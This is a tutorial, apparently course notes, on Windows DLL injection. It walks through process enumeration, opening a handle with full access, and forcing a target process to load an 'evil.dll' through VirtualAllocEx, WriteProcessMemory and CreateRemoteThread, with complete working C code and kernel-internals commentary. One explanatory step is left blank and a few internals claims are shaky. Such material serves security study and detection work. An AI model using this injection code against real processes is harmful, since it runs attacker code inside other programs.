---
icon: book-spine
---

# Process Injection DLL Injection

### **DLL Injection**

#### **Introduction**

Before being able to inject a DLL into a process, a target process\
must be chosen. Therefore the first step to remote process injection is\
usually to enumerate the running processes on the machine to know of\
potential target processes that can be injected. The process ID (or PID)\
is required to open a handle to the target process and allow the\
necessary work to be done on the target process.

This module creates a function that performs process enumeration to determine all the running processes. The function `GetRemoteProcessHandle`\
will be used to perform an enumeration of all running processes on the\
system, opening a handle to the target process and returning both PID\
and handle to the process.

***

### The Goal

Before you can inject anything into a remote process, you need two things: the target process's PID, and a handle to it with enough access rights to do what you want. The standard way to get both is a three step chain: take a snapshot of all running processes, walk that snapshot to find your target, then open a handle to it.

***

### CreateToolhelp32Snapshot

```c
HANDLE CreateToolhelp32Snapshot(
  [in] DWORD dwFlags,
  [in] DWORD th32ProcessID
);
```

#### What It Does

```c
HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
```

`TH32CS_SNAPPROCESS` tells the function you only want the process list, not threads or modules. The second parameter is a PID and is only relevant when snapshotting a specific process's modules or threads. For `TH32CS_SNAPPROCESS` it is ignored, so you pass NULL.

#### What Happens Inside the Kernel

When this function is called, it fires the `NtQuerySystemInformation` syscall with the `SystemProcessInformation` information class. The CPU switches from user mode (ring 3) to kernel mode (ring 0) and the System Service Dispatcher inside `ntoskrnl.exe` routes the call to the appropriate kernel routine.

The kernel then allocates a buffer and begins walking `PsActiveProcessHead`. This is a global doubly linked list that connects every running process's `_EPROCESS` structure through a field called `ActiveProcessLinks`. The actual layout in the `_EPROCESS` structure looks like this:

```
+0x2e8 UniqueProcessId    : Ptr64 Void
+0x2f0 ActiveProcessLinks : _LIST_ENTRY
+0x418 ObjectTable        : Ptr64 _HANDLE_TABLE
```

`ActiveProcessLinks` is a `LIST_ENTRY` structure with a `Flink` (forward link) and `Blink` (backward link). The kernel follows these links to visit every `_EPROCESS` in the system. For each one it extracts the process name, PID, parent PID, thread count, and other metadata, then packs it into a `SYSTEM_PROCESS_INFORMATION` structure. These structures are written back to back into the buffer until every process has been recorded.

#### Where the Data Goes

That buffer lives in your process's heap memory. `CreateToolhelp32Snapshot` then wraps it into a **Section object**, which is Windows's kernel-level mechanism for memory mapped regions. The kernel maps this Section into your process's virtual address space, meaning certain virtual addresses in your process now point directly to the RAM holding the snapshot data. The handle to this Section object is what gets returned to you as `hSnapshot`. It sits in your process's handle table like any other handle.

#### What hSnapshot Actually Is

`hSnapshot` is an integer, something like `0x4A8`. It is an index into your process's handle table, which lives in kernel memory. That slot in the handle table holds a pointer to the Section object's `_OBJECT_HEADER` and the access mask granted when it was created. Your process never knows the actual kernel address of the Section object. It just knows the index number.

***

### Process32First and Process32Next

#### PROCESSENTRY32

Before calling `Process32First`, you declare a `PROCESSENTRY32` structure on your stack and set `dwSize`:

```c
PROCESSENTRY32 Proc = {
    .dwSize = sizeof(PROCESSENTRY32)
};
```

`dwSize` must be set before the call. `Process32First` checks this field first and fails immediately if it is not initialized. The structure is on the stack, meaning it lives in your thread's stack frame and disappears when the function returns.

#### Process32First

```c
Process32First(hSnapshot, &Proc);
```

This function reads the first entry from the snapshot's mapped memory region and fills `Proc` with the data: process name in `szExeFile`, PID in `th32ProcessID`, parent PID in `th32ParentProcessID`, and a few other fields. You pass `&Proc`, the address of your stack variable, so the function writes directly into it.

#### The Loop

```c
do {
    // check Proc here
} while (Process32Next(hSnapshot, &Proc));
```

A `do-while` is used rather than a plain `while` because `Process32First` already filled `Proc` with the first process before the loop starts. If you used `while (Process32Next(...))` you would skip the first process entirely. Each call to `Process32Next` overwrites `Proc` with the next process's data. When no more processes remain, `Process32Next` returns FALSE and the loop exits.

***

### OpenProcess

#### The Call

Once you have the target PID from `Proc.th32ProcessID`:

```c
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
```

`PROCESS_ALL_ACCESS` requests every possible permission on the process. The second parameter controls handle inheritance, FALSE means the handle will not be inherited by child processes your code spawns.

#### What Happens Inside the Kernel

This call translates to the `NtOpenProcess` syscall internally. The kernel does not walk `PsActiveProcessHead` to find your target. Instead it uses **PspCidTable**, a global handle table that is not tied to any specific process. Windows Internals describes it exactly this way: process and thread IDs are stored in a global handle table called `PspCidTable` that is not associated with any process. The PID you pass is used as an index into this table to retrieve a pointer directly to the target's `_EPROCESS`. This is much faster than walking a linked list.

Once the kernel has the target's `_EPROCESS`, it calls `ObpCreateHandle`. This function first calls `ObpGrantAccess`, which calls `ObCheckObjectAccess`, which eventually reaches `SeAccessCheck`. This is the core of Windows's security model. It compares three things: your process's security token, the access mask you requested (`PROCESS_ALL_ACCESS`), and the target process's security descriptor (its DACL). If your token has sufficient privileges to be granted all the requested rights, access is allowed.

If the check passes, `ObpCreateHandle` calls `ExCreateHandle`, which creates a new entry in **your** process's handle table. That entry contains two things:

* A pointer to the target process's `_OBJECT_HEADER`, which sits directly before the `_EPROCESS` in kernel memory and contains the object type, reference count, and other metadata.
* The access mask that was actually granted.

The index of that new entry in your handle table is returned to you as `hProcess`.

#### Why a Pointer to \_OBJECT\_HEADER and Not \_EPROCESS Directly

Every kernel object, whether it is a process, thread, file, event, or anything else, is prefixed with an `_OBJECT_HEADER`. The object manager always works through this header because it encodes the object's type. When you later pass `hProcess` to `WriteProcessMemory`, the kernel calls `ObReferenceObjectByHandle`, which looks up the handle table entry, retrieves the pointer, reads the `_OBJECT_HEADER` to confirm this is actually a process object, checks that the access mask stored in the entry includes `PROCESS_VM_WRITE`, and only then proceeds. The pointer being to `_OBJECT_HEADER` rather than raw `_EPROCESS` is what makes this type safety possible.

#### What hProcess Is

Just like `hSnapshot`, `hProcess` is an integer index into your process's handle table. The actual `_EPROCESS` of the target process is in kernel memory. You never touch it directly. Everything you do with `hProcess` goes through the kernel, which uses the handle table entry to find the object and verify permissions on every single operation.

***

### Handles, Handle Tables, and \_OBJECT\_HEADER: The Full Picture

A handle is just a number. It is an index into your process's handle table, which lives in kernel memory and is pointed to by your `_EPROCESS` at offset `0x418` in the `ObjectTable` field.

Each slot in the handle table holds:

* A pointer to the `_OBJECT_HEADER` of the kernel object this handle refers to
* The access mask granted when the handle was opened

`_OBJECT_HEADER` is a structure that prefixes every kernel object. It contains the object type, reference count, name if any, and security descriptor pointer. The actual object data, like `_EPROCESS` for a process, comes immediately after the header in memory.

When you pass any handle to any Windows API, this is what happens internally every time:

This is why you cannot use a handle opened with read-only access to write memory. The access mask stored in the handle table entry is checked on every operation, not just at open time.

***

### Code Walkthrough:

```c
BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {

	// According to the documentation:
	// Before calling the Process32First function, set this member to sizeof(PROCESSENTRY32).
	// If dwSize is not initialized, Process32First fails.
	PROCESSENTRY32	Proc = {
		.dwSize = sizeof(PROCESSENTRY32)
	};

	HANDLE hSnapShot = NULL;

	// Takes a snapshot of the currently running processes 
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	// Retrieves information about the first process encountered in the snapshot.
	if (!Process32First(hSnapShot, &Proc)) {
		printf("[!] Process32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {

		WCHAR LowerName[MAX_PATH * 2];

		if (Proc.szExeFile) {
			DWORD	dwSize = lstrlenW(Proc.szExeFile);
			DWORD   i = 0;

			RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

			// Converting each charachter in Proc.szExeFile to a lower case character
			// and saving it in LowerName
			if (dwSize < MAX_PATH * 2) {

				for (; i < dwSize; i++)
					LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);

				LowerName[i++] = '\0';
			}
		}

		// If the lowercase'd process name matches the process we're looking for
		if (wcscmp(LowerName, szProcessName) == 0) {
			// Save the PID
			*dwProcessId = Proc.th32ProcessID;
			// Open a handle to the process
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			if (*hProcess == NULL)
				printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());

			break;
		}

		// Retrieves information about the next process recorded the snapshot.
		// While a process still remains in the snapshot, continue looping
	} while (Process32Next(hSnapShot, &Proc));

	// Cleanup
_EndOfFunction:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*dwProcessId == NULL || *hProcess == NULL)
		return FALSE;
	return TRUE;
}
```

```c
BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {

    PROCESSENTRY32 Proc = {
        .dwSize = sizeof(PROCESSENTRY32)
    };
```

`LPWSTR` is a wide string pointer, unicode. `dwProcessId` and `hProcess` are pointers to the caller's variables so this function can write results back out. `Proc` is on the stack with `dwSize` initialized.

```c
    HANDLE hSnapShot = NULL;
    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (hSnapShot == INVALID_HANDLE_VALUE) {
        printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
        goto _EndOfFunction;
    }
```

Snapshot taken. If it fails, `goto` jumps straight to cleanup. This pattern avoids nested if statements and keeps cleanup centralized.

```c
    if (!Process32First(hSnapShot, &Proc)) {
        printf("[!] Process32First Failed With Error : %d \n", GetLastError());
        goto _EndOfFunction;
    }
```

First process loaded into `Proc`. If this fails, something is seriously wrong with the snapshot.

```c
    do {
        WCHAR LowerName[MAX_PATH * 2];

        if (Proc.szExeFile) {
            DWORD dwSize = lstrlenW(Proc.szExeFile);
            DWORD i = 0;

            RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

            if (dwSize < MAX_PATH * 2) {
                for (; i < dwSize; i++)
                    LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);
                LowerName[i++] = '\0';
            }
        }
```

`Proc.szExeFile` holds the process name but its casing is unpredictable. `NOTEPAD.EXE`, `Notepad.exe`, anything is possible. Every character is lowercased into `LowerName`. `RtlSecureZeroMemory` clears the buffer first so previous iteration data does not bleed into a shorter name. Null terminator is added manually at the end.

```c
        if (wcscmp(LowerName, szProcessName) == 0) {
            *dwProcessId = Proc.th32ProcessID;
            *hProcess    = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
            if (*hProcess == NULL)
                printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());
            break;
        }

    } while (Process32Next(hSnapShot, &Proc));
```

`wcscmp` compares wide strings. Match found means the PID goes into the caller's variable through the pointer, `OpenProcess` runs and the returned handle goes into the caller's handle variable through the pointer. `break` exits the loop immediately since there is no reason to keep searching.

```c
    _EndOfFunction:
        if (hSnapShot != NULL)
            CloseHandle(hSnapShot);
        if (*dwProcessId == NULL || *hProcess == NULL)
            return FALSE;
        return TRUE;
}
```

`CloseHandle` on the snapshot decrements the Section object's reference count in the kernel. If it hits zero the kernel frees the memory. If either output is still null the target was not found or `OpenProcess` failed, so the function returns FALSE.

## Process Injection DLL Injection via LoadLibraryW

***

### The Core Idea

This technique does not inject shellcode directly. Instead it forces the target process to load your DLL by itself. The weapon is `LoadLibraryW`, a function that already exists inside every Windows process. You find its address, write your DLL's path into the target's memory, then spawn a remote thread that calls `LoadLibraryW` with that path as the argument. The target process loads your DLL off disk, and your `DllMain` runs inside it.

***

### Why This Works: kernel32.dll Is Everywhere

`kernel32.dll` is loaded into every single Windows process without exception. The important detail is that within one boot session, after ASLR resolves the base address of `kernel32.dll`, that base address is the same across all processes. This means `LoadLibraryW` sits at the same virtual address in your process and in the target process.

So you can call `GetProcAddress` in your own process to find `LoadLibraryW`, and that address is directly usable as a thread start point in any other process on the system.

***

### Step 1: Get the Address of LoadLibraryW

```c
pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
```

`GetModuleHandle(L"kernel32.dll")` returns the base address of `kernel32.dll` as it is loaded in your process. `GetProcAddress` walks the DLL's export table and returns the exact address of `LoadLibraryW`. The result is something like `0x7FFE2310A0`. This address is valid in the target process too because `kernel32.dll` is at the same base system-wide.

***

### Step 2: Calculate How Much Memory You Need

```c
DWORD dwSizeToWrite = lstrlenW(DllName) * sizeof(WCHAR);
```

`DllName` is a wide string, for example `L"C:\\Users\\hawo\\evil.dll"`. Wide strings use 2 bytes per character, which is what `sizeof(WCHAR)` gives you. You multiply the character count by 2 to get the total byte count. This is how many bytes you need to allocate in the target process to store the path.

***

### Step 3: Allocate Memory in the Target Process

```c
pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
```

`VirtualAllocEx` is `VirtualAlloc` with one extra parameter: `hProcess`. Everything works the same way internally, but the allocation happens inside the target process's address space instead of yours.

What the kernel does:

The kernel takes `hProcess`, looks it up in your handle table, gets a pointer to the target's `_EPROCESS`, verifies you have `PROCESS_VM_OPERATION` access, then switches context to the target process's address space. It creates a new VAD node in the target's VAD tree, sets up PTEs in demand zero state, and returns a virtual address that belongs to the target process's address space.

`pAddress` is something like `0x1F000000`. This address exists in the target process. In your process this address might point to something completely different or not exist at all. You cannot dereference `pAddress` from your process. It is only meaningful inside the target.

***

### Step 4: Write the DLL Path into the Target

```c
WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten);
```

This copies your DLL path string into the memory you just allocated inside the target process.

What the kernel does:

It validates `hProcess` and checks that the handle has `PROCESS_VM_WRITE` access. It then uses the target process's page tables to resolve `pAddress` to its physical RAM location. If that page has not been faulted in yet (demand zero state), the page fault handler runs first to assign physical RAM. Then the kernel copies `dwSizeToWrite` bytes from `DllName` in your process into that physical page.

After this call, at virtual address `0x1F000000` inside the target process, the bytes `C:\Users\hawo\evil.dll` now exist in physical RAM.

`lpNumberOfBytesWritten` is checked against `dwSizeToWrite` to confirm the full string was written. A partial write means something went wrong.

***

### Step 5: Spawn a Remote Thread to Call LoadLibraryW

```c
hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
```

This is the trigger. You are creating a new thread inside the target process. That thread's start address is `pLoadLibraryW`, meaning the thread begins executing at `LoadLibraryW`. The `pAddress` parameter is passed as the argument to that function.

`LoadLibraryW` has this signature:

```c
HMODULE LoadLibraryW(LPCWSTR lpLibFileName);
```

`CreateRemoteThread`'s `lpParameter` maps directly to the thread function's first argument. So what actually executes inside the target process is:

```c
LoadLibraryW(L"C:\\Users\\hawo\\evil.dll");
```

The target process's own `LoadLibraryW` reads the path from `0x1F000000`, opens the file from disk, maps it into the target process's address space, resolves its imports, and calls `DllMain`. Your code now runs inside the target process.

What the kernel does for `CreateRemoteThread`:

It validates `hProcess` and checks for `PROCESS_CREATE_THREAD` access. It creates a new `_ETHREAD` object, sets the thread's start address to `pLoadLibraryW`, sets the thread's argument to `pAddress`, inserts the thread into the target process's thread list, and schedules it for execution. The thread runs entirely inside the target process's context.

***

### Why the DLL Path and Not the DLL Itself

You are not copying your DLL's bytes into the target process. You are copying a file path string. `LoadLibraryW` handles the actual loading: it reads the DLL from disk, maps its sections into memory, resolves all imports, applies relocations, and calls `DllMain`. You are just pointing it at the right file.

This means your DLL must exist on disk at the path you provide. If the path is wrong or the file does not exist, `LoadLibraryW` fails and nothing happens.

***

### DllMain

When `LoadLibraryW` finishes mapping your DLL, it calls `DllMain` with `DLL_PROCESS_ATTACH`. This is your entry point. Whatever code you put in `DllMain` under `DLL_PROCESS_ATTACH` runs inside the target process, in the target process's context, with access to the target process's memory.

```c
BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        // your payload runs here, inside the target process
    }
    return TRUE;
}
```

***

### Code Walkthrough

```jsx
BOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR DllName) {

	BOOL		bSTATE                    = TRUE;
	
	LPVOID		pLoadLibraryW             = NULL;
	LPVOID		pAddress                  = NULL;
	
	// fetching the size of DllName *in bytes* 
	DWORD		dwSizeToWrite             = lstrlenW(DllName) * sizeof(WCHAR);

	SIZE_T		lpNumberOfBytesWritten    = NULL;

	HANDLE		hThread                   = NULL;

	pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
	if (pLoadLibraryW == NULL){
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	printf("[i] pAddress Allocated At : 0x%p Of Size : %d\n", pAddress, dwSizeToWrite);
	printf("[#] Press <Enter> To Write ... ");
	getchar();

	if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwSizeToWrite){
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	printf("[i] Successfully Written %d Bytes\n", lpNumberOfBytesWritten);
	printf("[#] Press <Enter> To Run ... ");
	getchar();

	printf("[i] Executing Payload ... ");
	hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
	if (hThread == NULL) {
		printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}
	printf("[+] DONE !\n");

_EndOfFunction:
	if (hThread)
		CloseHandle(hThread);
	return bSTATE;
}
```

```c
BOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR DllName) {

    BOOL    bSTATE = TRUE;
    LPVOID  pLoadLibraryW = NULL;
    LPVOID  pAddress = NULL;
    DWORD   dwSizeToWrite = lstrlenW(DllName) * sizeof(WCHAR);
    SIZE_T  lpNumberOfBytesWritten = NULL;
    HANDLE  hThread = NULL;
```

`bSTATE` is the return value, starts TRUE and gets set to FALSE on any failure. `dwSizeToWrite` is calculated upfront: wide string length in characters multiplied by 2 bytes per character.

```c
    pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
    if (pLoadLibraryW == NULL) {
        bSTATE = FALSE; goto _EndOfFunction;
    }
```

Get `LoadLibraryW`'s address from your own process. If this fails something is seriously broken with the environment.

```c
    pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) {
        bSTATE = FALSE; goto _EndOfFunction;
    }
```

Allocate memory in the target process. `pAddress` is a virtual address in the target's address space. NULL on failure means the kernel rejected the allocation, likely due to insufficient access rights or the target process exiting.

```c
    if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten)
        || lpNumberOfBytesWritten != dwSizeToWrite) {
        bSTATE = FALSE; goto _EndOfFunction;
    }
```

Write the DLL path into the target. The double check, return value and bytes written count, catches both outright failure and partial writes.

```c
    hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
    if (hThread == NULL) {
        bSTATE = FALSE; goto _EndOfFunction;
    }
```

Spawn the thread in the target. From this point the injection is out of your hands. The target process runs `LoadLibraryW` with your DLL path and your `DllMain` executes.

```c
    _EndOfFunction:
        if (hThread)
            CloseHandle(hThread);
        return bSTATE;
}
```

`CloseHandle` on `hThread` does not kill the remote thread. It just decrements the thread object's reference count in the kernel. The thread keeps running in the target process. This just releases your handle to it since you no longer need it.
